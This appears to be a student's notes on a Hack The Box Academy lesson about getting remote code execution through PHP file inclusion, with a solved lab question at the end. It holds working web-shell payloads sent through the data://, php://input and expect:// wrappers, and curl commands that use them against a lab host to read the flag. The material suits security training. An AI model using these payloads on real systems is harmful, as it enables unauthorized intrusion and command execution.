So far in this module, we have been exploiting file inclusion vulnerabilities to disclose local files through various methods. From this section, we will start learning how we can use file inclusion vulnerabilities to execute code on the back-end servers and gain control over them.

We can use many methods to execute remote commands, each of which has a specific use case, as they depend on the back-end language/framework and the vulnerable function's capabilities. One easy and common method for gaining control over the back-end server is by enumerating user credentials and SSH keys, and then use those to login to the back-end server through SSH or any other remote session. For example, we may find the database password in a file likeÂ `config.php`, which may match a user's password in case they re-use the same password. Or we can check theÂ `.ssh`Â directory in each user's home directory, and if the read privileges are not set properly, then we may be able to grab their private key (`id_rsa`) and use it to SSH into the system.

Other than such trivial methods, there are ways to achieve remote code execution directly through the vulnerable function without relying on data enumeration or local file privileges. In this section, we will start with remote code execution on PHP web applications. We will build on what we learned in the previous section, and will utilize differentÂ `PHP Wrappers`Â to gain remote code execution. Then, in the upcoming sections, we will learn other methods to gain remote code execution that can be used with PHP and other languages as well.

---

## Data

TheÂ [data](https://www.php.net/manual/en/wrappers.data.php)Â wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the (`allow_url_include`) setting is enabled in the PHP configurations. So, let's first confirm whether this setting is enabled, by reading the PHP configuration file through the LFI vulnerability.

#### Checking PHP Configurations

To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, whereÂ `X.Y`Â is your install PHP version. We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file. We will also use theÂ `base64`Â filter we used in the previous section, asÂ `.ini`Â files are similar toÂ `.php`Â files and should be encoded to avoid breaking. Finally, we'll use cURL or Burp instead of a browser, as the output string could be very long and we should be able to properly capture it:

```shell-session
smoothment@htb[/htb]$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
<!DOCTYPE html>

<html lang="en">
...SNIP...
 <h2>Containers</h2>
    W1BIUF0KCjs7Ozs7Ozs7O
    ...SNIP...
    4KO2ZmaS5wcmVsb2FkPQo=
<p class="read-more">
```

Once we have the base64 encoded string, we can decode it andÂ `grep`Â forÂ `allow_url_include`Â to see its value:

```shell-session
smoothment@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

Excellent! We see that we have this option enabled, so we can use theÂ `data`Â wrapper. Knowing how to check for theÂ `allow_url_include`Â option can be very important, asÂ `this option is not enabled by default`, and is required for several other LFI attacks, like using theÂ `input`Â wrapper or for any RFI attack, as we'll see next. It is not uncommon to see this option enabled, as many web applications rely on it to function properly, like some WordPress plugins and themes, for example.

#### Remote Code Execution

WithÂ `allow_url_include`Â enabled, we can proceed with ourÂ `data`Â wrapper attack. As mentioned earlier, theÂ `data`Â wrapper can be used to include external data, including PHP code. We can also pass itÂ `base64`Â encoded strings withÂ `text/plain;base64`, and it has the ability to decode them and execute the PHP code.

So, our first step would be to base64 encode a basic PHP web shell, as follows:


```shell-session
smoothment@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Now, we can URL encode the base64 string, and then pass it to the data wrapper withÂ `data://text/plain;base64,`. Finally, we can use pass commands to the web shell withÂ `&cmd=<COMMAND>`:

```
http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
```
![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

We may also use cURL for the same attack, as follows:


```shell-session
smoothment@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Input

Similar to theÂ `data`Â wrapper, theÂ [input](https://www.php.net/manual/en/wrappers.php.php)Â wrapper can be used to include external input and execute PHP code. The difference between it and theÂ `data`Â wrapper is that we pass our input to theÂ `input`Â wrapper as a POST request's data. So, the vulnerable parameter must accept POST requests for this attack to work. Finally, theÂ `input`Â wrapper also depends on theÂ `allow_url_include`Â setting, as mentioned earlier.

To repeat our earlier attack but with theÂ `input`Â wrapper, we can send a POST request to the vulnerable URL and add our web shell as POST data. To execute a command, we would pass it as a GET parameter, as we did in our previous attack:


```shell-session
smoothment@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Note:**Â To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. useÂ `$_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g.Â `<\?php system('id')?>`)

---

## Expect

Finally, we may utilize theÂ [expect](https://www.php.net/manual/en/wrappers.expect.php)Â wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells we've used earlier, but don't need to provide a web shell, as it is designed to execute commands.

However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases. We can determine whether it is installed on the back-end server just like we did withÂ `allow_url_include`Â earlier, but we'dÂ `grep`Â forÂ `expect`Â instead, and if it is installed and enabled we'd get the following:


```shell-session
smoothment@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

As we can see, theÂ `extension`Â configuration keyword is used to enable theÂ `expect`Â module, which means we should be able to use it for gaining RCE through the LFI vulnerability. To use the expect module, we can use theÂ `expect://`Â wrapper and then pass the command we want to execute, as follows:


```shell-session
smoothment@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

As we can see, executing commands through theÂ `expect`Â module is fairly straightforward, as this module was designed for command execution, as mentioned earlier. TheÂ [Web Attacks](https://academy.hackthebox.com/module/details/134)Â module also covers using theÂ `expect`Â module with XXE vulnerabilities, so if you have a good understanding of how to use it here, you should be set up for using it with XXE.

These are the most common three PHP wrappers for directly executing system commands through LFI vulnerabilities. We'll also cover theÂ `phar`Â andÂ `zip`Â wrappers in upcoming sections, which we may use with web applications that allow file uploads to gain remote execution through LFI vulnerabilities.

# Question
---

![Pasted image 20250218145707.png](../../../../IMAGES/Pasted%20image%2020250218145707.png)

Let's begin by checking the php configurations:

```bash
curl "http://94.237.54.42:58628/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

This outputs a very large base64 string, let's decode it and check only the important stuff:

![Pasted image 20250218150047.png](../../../../IMAGES/Pasted%20image%2020250218150047.png)

As seen `allow_url_include` is enabled, let's check if `expect` is enabled too:

![Pasted image 20250218150131.png](../../../../IMAGES/Pasted%20image%2020250218150131.png)

`Expect` is enabled too, for this case, I will use input, let's check it out:

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://IP:PORT/index.php?language=php://input&cmd=id" | grep uid
```

![Pasted image 20250218150502.png](../../../../IMAGES/Pasted%20image%2020250218150502.png)

We got command execution, let's read the root directory and search for the flag:

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.54.42:58628/index.php?language=php://input&cmd=ls%20/" | grep -oE '[a-f0-9]{32}\.txt'
```

We got the following:

```
37809e2f8952f06139011994726d9ef1.txt
```

Let's read our flag:

```
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://94.237.54.42:58628/index.php?language=php://input&cmd=cat+/37809e2f8952f06139011994726d9ef1.txt" | grep HTB
```

We get this:

```
HTB{d!$46l3_r3m0t3_url_!nclud3}
```

